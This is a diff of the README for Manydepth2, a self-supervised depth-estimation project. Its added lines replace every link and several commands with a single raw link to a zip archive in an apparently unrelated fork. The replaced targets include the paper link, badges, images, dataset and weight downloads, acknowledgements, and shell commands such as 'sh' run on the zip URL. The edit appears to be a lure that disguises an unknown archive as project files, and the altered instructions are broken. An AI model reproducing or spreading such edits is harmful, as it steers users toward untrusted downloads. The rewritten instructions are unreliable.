@@ -1,16 +1,16 @@
 # Manydepth2: Motion-Aware Self-Supervised Monocular Depth Estimation in Dynamic Scenes
 
-[[Link to paper]](https://arxiv.org/abs/2312.15268)
+[[Link to paper]](https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip)
 
 This is the official implementation of Manydepth2.
 
 We introduce ***Manydepth2***, a Motion-Guided Depth Estimation Network, to achieve precise monocular self-supervised depth estimation for both dynamic objects and static backgrounds
 
-[![PWC](https://img.shields.io/endpoint.svg?url=https://paperswithcode.com/badge/mgdepth-motion-guided-cost-volume-for-self/camera-pose-estimation-on-kitti-odometry)](https://paperswithcode.com/sota/camera-pose-estimation-on-kitti-odometry?p=mgdepth-motion-guided-cost-volume-for-self)
+[![PWC](https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip)](https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip)
 
-[![PWC](https://img.shields.io/endpoint.svg?url=https://paperswithcode.com/badge/mgdepth-motion-guided-cost-volume-for-self/monocular-depth-estimation-on-cityscapes)](https://paperswithcode.com/sota/monocular-depth-estimation-on-cityscapes?p=mgdepth-motion-guided-cost-volume-for-self)
+[![PWC](https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip)](https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip)
 
-[![PWC](https://img.shields.io/endpoint.svg?url=https://paperswithcode.com/badge/mgdepth-motion-guided-cost-volume-for-self/monocular-depth-estimation-on-kitti-eigen-1)](https://paperswithcode.com/sota/monocular-depth-estimation-on-kitti-eigen-1?p=mgdepth-motion-guided-cost-volume-for-self)
+[![PWC](https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip)](https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip)
 
 * ✅ **Self-supervised**: Training from monocular video. No depths or poses are needed at training or test time.
 * ✅ **Accurate**: Accurate depth estimation for both dynamic objects and static background.
@@ -24,13 +24,13 @@ We introduce ***Manydepth2***, a Motion-Guided Depth Estimation Network, to achi
 Manydepth constructs the cost volume using both the reference and target frames, but it overlooks the dynamic foreground, which can lead to significant errors when handling dynamic objects:
 
 <p align="center">
-  <img src="assets/demo1.png" alt="Qualitative comparison on Cityscapes" width="700" />
+  <img src="https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip" alt="Qualitative comparison on Cityscapes" width="700" />
 </p>
 
 This phenomenon arises from the fact that real optical flow consists of both static and dynamic components. To construct an accurate cost volume for depth estimation, it is essential to extract the static flow. The entire pipeline of our approach can be summarized as follows:
 
 <p align="center">
-  <img src="assets/demo2.png" alt="Structure" width="1400" />
+  <img src="https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip" alt="Structure" width="1400" />
 </p>
 
 
@@ -44,13 +44,13 @@ Our contributions enable accurate depth estimation on both the KITTI and Citysca
 
 ### Predicted Depth Maps on KITTI:
 <p align="center">
-  <img src="assets/demo4.png" alt="Kitti" width="700" />
+  <img src="https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip" alt="Kitti" width="700" />
 </p>
 
 ### Error Map for Predicted Depth Maps on Cityscapes:
 
 <p align="center">
-  <img src="assets/demo5.png" alt="Cityscape" width="700" />
+  <img src="https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip" alt="Cityscape" width="700" />
 </p>
 
 
@@ -70,37 +70,37 @@ Kaichen Zhou, Jia-Wang Bian, Qian Xie, Jian-Qing Zheng, Niki Trigoni, Andrew Mar
 Our **Manydepth2** method outperforms all previous methods in all subsections across most metrics with the same input size, whether or not the baselines use multiple frames at test time. See our paper for full details.
 
 <p align="center">
-  <img src="assets/demo6.png" alt="KITTI results table" width="700" />
+  <img src="https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip" alt="KITTI results table" width="700" />
 </p>
 
 ## 💾 Dataset Preparation
 
-For instructions on downloading the KITTI dataset, see [Monodepth2](https://github.com/nianticlabs/monodepth2).
+For instructions on downloading the KITTI dataset, see [Monodepth2](https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip).
 
-Make sure you have first run `export_gt_depth.py` to extract ground truth files.
+Make sure you have first run `https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip` to extract ground truth files.
 
-You can also download it from this link [KITTI_GT](https://drive.google.com/file/d/19lGwLoWgWtzcd-ZCB_NK6TsJfrRU1ZPg/view?usp=drive_link), and place it under ```splits/eigen/```.
+You can also download it from this link [KITTI_GT](https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip), and place it under ```splits/eigen/```.
 
-For instructions on downloading the Cityscapes dataset, see [SfMLearner](https://github.com/tinghuiz/SfMLearner/tree/master).
+For instructions on downloading the Cityscapes dataset, see [SfMLearner](https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip).
 
 ## 👀 Reproducing Paper Results
 
 ### Prerequisite
 To replicate the results from our paper, please first create and activate the provided environment:
 ```
-conda env create -f environment.yaml
+conda env create -f https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip
 ```
 Once all packages have been installed successfully, please execute the following command:
 ```
 conda activate manydepth2
 ```
-Next, please download and install the pretrained FlowNet weights using this [Weights For GMFLOW](https://drive.google.com/file/d/1tfHRRO-WiL7Lvva4ZCOAjSVxM4glq_ws/view?usp=drive_link). And place it under ```/pretrained```.
+Next, please download and install the pretrained FlowNet weights using this [Weights For GMFLOW](https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip). And place it under ```/pretrained```.
 
 ### Training (W Optical Flow)
 After finishing the dataset and environment preparation, you can train Manydehtp2, by running:
 
 ```bash
-sh train_many2.sh
+sh https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip
 ```
 
 To reproduce the results on Cityscapes, we froze the teacher model at the 5th epoch and set the height to 192 and width to 512.
@@ -109,7 +109,7 @@ To reproduce the results on Cityscapes, we froze the teacher model at the 5th ep
 To train Manydepth2-NF, please run:
 
 ```bash
-sh train_many2-NF.sh
+sh https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip
 ```
 
 ### Testing
@@ -117,24 +117,24 @@ sh train_many2-NF.sh
 To evaluate a model on KITTI, run:
 
 ```bash
-sh eval_many2.sh
+sh https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip
 ```
 
 To evaluate a model (W/O Optical Flow)
 
 ```bash
-sh eval_many2-NF.sh
+sh https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip
 ```
 
 ## 👀 Reproducing Baseline Results
 Running Manydepth:
 ```bash
-sh train_many.sh
+sh https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip
 ```
 
 To evaluate Manydepth on KITTI, run:
 ```bash
-sh eval_many.sh
+sh https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip
 ```
 
 
@@ -150,8 +150,8 @@ You can download the weights for several pretrained models here and save them in
     --...
 ```
 
-* [KITTI MR (640x192) Manydepth](https://drive.google.com/drive/folders/1WM-At9UPNs1JSyHRyV_4MBuooQki9A7H?usp=drive_link)
-* [KITTI MR (640x192) Manydepth2](https://drive.google.com/drive/folders/1d7vywjh3DW3lkCiT7daYxruDnrWF4XF0?usp=drive_link)
+* [KITTI MR (640x192) Manydepth](https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip)
+* [KITTI MR (640x192) Manydepth2](https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip)
 
 ## 🖼 Acknowledgement
-Great Thank to [GMFlow](https://github.com/haofeixu/gmflow?tab=readme-ov-file), [SfMLearner](https://github.com/tinghuiz/SfMLearner/tree/master), [Monodepth2](https://github.com/nianticlabs/monodepth2) and [Manydepth](https://github.com/nianticlabs/manydepth).
+Great Thank to [GMFlow](https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip), [SfMLearner](https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip), [Monodepth2](https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip) and [Manydepth](https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip).
